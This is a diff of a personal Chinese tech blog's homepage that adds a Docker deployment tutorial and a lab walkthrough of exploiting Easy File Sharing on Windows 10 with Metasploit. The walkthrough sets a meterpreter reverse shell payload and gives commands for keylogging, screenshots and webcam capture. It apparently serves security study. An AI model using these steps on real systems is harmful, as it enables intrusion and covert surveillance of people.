@@ -9,11 +9,11 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-     奈何人是剧中人
+     の
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
-  <link rel="shortcut icon" href="/favicon.ico" />
+  <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/favicon.ico" />
   
   
 <link rel="stylesheet" href="/dist/main.css">
@@ -33,7 +33,7 @@
 
   
 
-<link rel="alternate" href="/atom.xml" title="奈何人是剧中人" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="の" type="application/atom+xml">
 </head>
 
 </html>
@@ -56,10 +56,10 @@
     
   <div class="cover-frame">
     <div class="bg-box">
-      <img src="/images/cover1.jpg" alt="image frame" />
+      <img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/cover2.jpg" alt="image frame" />
     </div>
     <div class="cover-inner text-center text-white">
-      <h1><a href="/">奈何人是剧中人</a></h1>
+      <h1><a href="/">の</a></h1>
       <div id="subtitle-box">
         
         <span id="subtitle"></span>
@@ -85,7 +85,7 @@
   <script>
     try {
       var typed = new Typed("#subtitle", {
-        strings: ['面朝大海，春暖花开', 'Welcome to my blog!', ''],
+        strings: ['心是看客心，人是戏中人', '', ''],
         startDelay: 0,
         typeSpeed: 200,
         loop: true,
@@ -147,6 +147,129 @@
     
     
     
+    
+    <article
+  id="post-利用docker将web项目部署到服务器"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/03/31/%E5%88%A9%E7%94%A8docker%E5%B0%86web%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"
+    >利用docker将web项目部署到服务器</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/03/31/%E5%88%A9%E7%94%A8docker%E5%B0%86web%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="article-date">
+  <time datetime="2019-03-30T16:00:00.000Z" itemprop="datePublished">2019-03-31</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><strong>完成了一个简单的web项目，想部署到云服务器，利用docker是一个很好的办法</strong></p>
+<h2 id="创建docker容器"><a href="#创建docker容器" class="headerlink" title="创建docker容器"></a>创建docker容器</h2><p>在当前web项目目录下创建Dockerfile和requirements.txt两个文件。文件填写内容根据你的web项目来定，具体参考官网教程。<a target="_blank" rel="noopener" href="https://docs.docker.com/get-started/part2/#define-a-container-with-dockerfile">～～docker官网～～</a><br><img src="https://s2.ax1x.com/2019/03/30/ABTpIs.png" alt="我的目录结构"></p>
+<p>接下来创建docker镜像，打开终端，输入<br><code>docker image build -t name .</code><br>name为你创建的镜像名字，自定义，注意不要漏了name后的那个“.”<br>然后输入<code>docker image ls</code><br><img src="https://s2.ax1x.com/2019/03/30/ABTdJI.png" alt="在这里插入图片描述"><br>显示已存在的docker镜像，cumt是我的web项目，下面我要将cumt这个镜像部署到我的阿里云服务器。</p>
+<h2 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h2><p>将docker镜像导出为静态文件<br><code> docker save cumt:latest &gt; cumt.tar</code></p>
+<p>cumt:latest为镜像名, cumt.tar为新生成的静态文件名。</p>
+<h2 id="部署到云服务器"><a href="#部署到云服务器" class="headerlink" title="部署到云服务器"></a>部署到云服务器</h2><p>使用scp将静态文件上传到服务器端<br><code>scp ./cumt.tar root@47.106.130.6:/cumt.tar</code></p>
+<p>使用ssh登陆你的云服务器<br><code>ssh root@47.106.130.6</code></p>
+<p>输入ls查看是否上传成功<br><code>ls</code></p>
+<p>如果ls下没有找到你上传的静态文件，使用find命令查找它。<br><code>find / -name cumt.tar</code></p>
+<h2 id="还原静态文件"><a href="#还原静态文件" class="headerlink" title="还原静态文件"></a>还原静态文件</h2><p>在静态文件所在位置目录下运行docker load命令还原。<br><code>docker load &lt; cumt.tar</code><br>输入<code>docker image ls</code>发现，已还原为镜像文件。<br><img src="https://s2.ax1x.com/2019/03/30/AB7mX8.png" alt="cumt镜像已还原"></p>
+<p>大功告成，可以直接运行了，如果不需要连接数据库的话直接输入<br><code>docker run -p 4000:5000 cumt</code><br>如果需要连接数据库，则需要用link方法挂载数据库（前提是你已经有数据库镜像）<br><code>docker run --link your-mysql -p 4000:5000 cumt</code><br>访问服务器公网的4000端口就可以访问你的web项目了。注意要在控制台打开服务器的4000端口（映射端口号可以自定义）</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h2><p><strong>利用静态文件进行容器的迁移, 是一件非常简单的事情, 你可以像发布一个软件包一样将自己的docker容器生成的静态文件分发到各类操作系统, docker才是真正的跨平台呀!</strong></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-利用msf攻击win10"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/03/30/%E5%88%A9%E7%94%A8msf%E6%94%BB%E5%87%BBwin10/"
+    >利用msf攻击win10</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/03/30/%E5%88%A9%E7%94%A8msf%E6%94%BB%E5%87%BBwin10/" class="article-date">
+  <time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished">2019-03-30</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <hr>
+<p>攻击环境：<br>攻击者系统：虚拟机下kali linux<br>靶机系统：win10（需要打开Easy File Sharing服务）<br>攻击者ip：10.3.134.27<br>靶机ip：10.3.37.56<br>攻击者和靶机在同一个wifi下，保证在同一网段里，能互相ping通。<br>漏洞利用：EsayFileSharing</p>
+<h6 id="注意点：-攻击者的虚拟机网络模式应选择桥接模式。"><a href="#注意点：-攻击者的虚拟机网络模式应选择桥接模式。" class="headerlink" title="注意点： 攻击者的虚拟机网络模式应选择桥接模式。"></a><strong>注意点：</strong> 攻击者的虚拟机网络模式应选择桥接模式。</h6><hr>
+<p><strong>准备工作完成，可以开始内网渗透之旅了。</strong></p>
+<h2 id="step-1"><a href="#step-1" class="headerlink" title="step-1"></a>step-1</h2><p>首先我们先用nmap扫描一下靶机开了哪些服务<br><code>root@kali:~# nmap -sV 10.3.37.56</code><br><img src="https://s2.ax1x.com/2019/03/30/AByzVK.png" alt="namp扫描结果">我们可以看到80端口和443端口开放了，对应的是Easy File Sharing Web Server，满足EasyFileSharing漏洞攻击，进入下一步。</p>
+<h2 id="step-2"><a href="#step-2" class="headerlink" title="step-2"></a>step-2</h2><p>打开msf控制台，设置攻击参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole              #进入控制台，稍微等一下</span><br><span class="line">msf &gt; search EasyFileSharing         #查找我们要用的漏洞</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/30/AB63Mn.png" alt="搜索结果"><br>我们选择最新的一个，2017-06-12的版本，并设置payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;http&#x2F;easyfilesharing_post    #使用这个漏洞</span><br><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp   #设置攻击payload</span><br></pre></td></tr></table></figure>
+<p>我们用show options看一下需要什么攻击参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; show options</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/30/AB6bo8.png" alt="设置参数"><br>根据Required属性看一下哪些是需要配置的，其中一些是配置好的，我们只需将其他的配置好就ok了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set lhost 10.3.134.27   #设置本地ip</span><br><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set rhost 10.3.37.56    #设置远程ip</span><br></pre></td></tr></table></figure>
+<p>参数都配置好了，接着就是激动人心的exploit了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; exploit   #攻击</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/03/30/ABcCwV.png" alt="显示这个页面，说明你成功了"><br>逐个输入以下命令，试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid          #获取靶机uid</span><br><span class="line">meterpreter &gt; shell           #进入靶机shell</span><br><span class="line">meterpreter &gt; screenshot      #靶机截屏</span><br><span class="line">meterpreter &gt; webcam_snap     #用靶机摄像头拍照</span><br><span class="line">meterpreter &gt; webcam_stream   #用靶机摄像头录像</span><br><span class="line">meterpreter &gt; keyscan_start   #开启键盘记录</span><br><span class="line">meterpreter &gt; keyscan_dump    #捕获键盘记录</span><br><span class="line">meterpreter &gt; keyscan_stop    #停止键盘记录</span><br></pre></td></tr></table></figure>
+<p>我们来测试几个好玩的<br><strong><em>1st.捕捉靶机键盘记录</em></strong><br><img src="https://s2.ax1x.com/2019/03/30/ABcO76.png" alt="捕捉到靶机键盘记录（hack hack）"><br><strong><em>2nd.捕捉靶机截屏</em></strong><br><img src="https://s2.ax1x.com/2019/03/30/ABgkHP.png" alt="捕捉靶机截屏"><br><img src="https://s2.ax1x.com/2019/03/30/ABg9cd.md.jpg" alt="捕捉靶机截屏"><br><strong><em>3rd.用靶机摄像头拍照</em></strong><br><img src="https://s2.ax1x.com/2019/03/30/ABg8EV.png" alt="利用靶机摄像头拍照"><br><img src="https://s2.ax1x.com/2019/03/30/ABgn3Q.jpg" alt="靶机摄像头像素略渣，不过看看我们的公教区学习环境吧"></p>
+<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p><strong>我们做攻击实验都是在环境都配置好的情况下，现实生活中不会有这么好的肉鸡。而且网络攻击属于违法行为，人生路漫漫，且行且珍惜hhhhh</strong></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
     
     <article
   id="post-xss(1~10)"
@@ -519,13 +642,13 @@
 <p>执行没有报错的话hexo应该就可以用了,在blog目录下输入以下命令.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g     # 生成静态界面</span><br><span class="line">hexo s     # 开启本地服务</span><br></pre></td></tr></table></figure>
 <p>如果命令行结果如下则安装成功了,此时你可以crtl+鼠标点击命令行url进入该页面。<br><img src="https://s2.ax1x.com/2019/02/08/kNeniR.png" alt="测试安装成功"></p>
-<h2 id="4-配置本机全局git环境"><a href="#4-配置本机全局git环境" class="headerlink" title="4.配置本机全局git环境"></a>4.配置本机全局git环境</h2><p>假设我的邮箱是<a href="mailto:&#116;&#111;&#x6d;&#x40;&#x67;&#109;&#97;&#105;&#108;&#46;&#x63;&#111;&#109;">&#116;&#111;&#x6d;&#x40;&#x67;&#109;&#97;&#105;&#108;&#46;&#x63;&#111;&#109;</a>,github的名字是tom</p>
+<h2 id="4-配置本机全局git环境"><a href="#4-配置本机全局git环境" class="headerlink" title="4.配置本机全局git环境"></a>4.配置本机全局git环境</h2><p>假设我的邮箱是<a href="mailto:&#116;&#111;&#x6d;&#64;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;">&#116;&#111;&#x6d;&#64;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;</a>,github的名字是tom</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email “tom@gmail.com” </span><br><span class="line">git config --global user.name “tom”</span><br></pre></td></tr></table></figure>
 <h2 id="5-生成ssh密钥"><a href="#5-生成ssh密钥" class="headerlink" title="5.生成ssh密钥"></a>5.生成ssh密钥</h2><p>命令端输入,生成ssh密钥</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C tom@gmail.com</span><br></pre></td></tr></table></figure>
 <p>会提示让你输入文件夹的名字来存放ssh秘钥，并且让你确认一个验证的密码，按要求操作就好了。然后输入下面命令查看ssh密钥文件中的公钥内容.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less ~&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
-<h2 id="6-创建博客工程"><a href="#6-创建博客工程" class="headerlink" title="6.创建博客工程"></a>6.创建博客工程</h2><p>建一个新的仓库，假设你的用户名是tom，那么你生成的这个工程命名必须为<a href="mailto:&#x74;&#111;&#x6d;&#x40;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x69;&#x6f;">&#x74;&#111;&#x6d;&#x40;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x69;&#x6f;</a>。(下图中是我个人的github用户名,为wxt406611016)<br><img src="https://s2.ax1x.com/2019/02/08/kNeuJ1.png" alt="本例中用户名为wxt406611016"><br>其他的按照默认配置就可以,然后点击Create repository创建.</p>
+<h2 id="6-创建博客工程"><a href="#6-创建博客工程" class="headerlink" title="6.创建博客工程"></a>6.创建博客工程</h2><p>建一个新的仓库，假设你的用户名是tom，那么你生成的这个工程命名必须为<a href="mailto:&#x74;&#x6f;&#109;&#64;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#105;&#111;">&#x74;&#x6f;&#109;&#64;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#105;&#111;</a>。(下图中是我个人的github用户名,为wxt406611016)<br><img src="https://s2.ax1x.com/2019/02/08/kNeuJ1.png" alt="本例中用户名为wxt406611016"><br>其他的按照默认配置就可以,然后点击Create repository创建.</p>
 <p><strong>然后将你的ssh密钥添加到你的github中</strong><br>在你的github页面依次点击Settings-&gt;SSH and GPG keys-&gt;New SSH key,将第五步中的公钥内容复制到Key里,点击Add SSH key.(如下图)<br><img src="https://s2.ax1x.com/2019/02/08/kNeeo9.png" alt="添加页面"></p>
 <h2 id="7-在hexo中配置git"><a href="#7-在hexo中配置git" class="headerlink" title="7.在hexo中配置git"></a>7.在hexo中配置git</h2><p>在blog文件夹下的 config.yml文件中配置你的git,添加以下代码.<br>注意代码中的xxx为你的github的用户名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: ssh:&#x2F;&#x2F;git@github.com&#x2F;xxx&#x2F;xxx.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
@@ -627,7 +750,7 @@
 <nav class="navbar">
   
   <div class="logo">
-    <a href="/"><img src="/images/ayer-side.svg" alt="奈何人是剧中人"></a>
+    <a href="/"><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/ayer-side.svg" alt="の"></a>
   </div>
   
   <ul class="nav nav-main">
@@ -645,11 +768,11 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/tags">标签</a>
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://wxt123.top/downloads/">云盘</a>
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/links">友链</a>
+      <a class="nav-item-link" href="/friends">友链</a>
     </li>
     
     <li class="nav-item">
@@ -696,13 +819,13 @@
   <div class="reward-box">
     
     <div class="reward-item">
-      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222926.png">
       <span class="reward-type">支付宝</span>
     </div>
     
     
     <div class="reward-item">
-      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222736.png">
       <span class="reward-type">微信</span>
     </div>
     
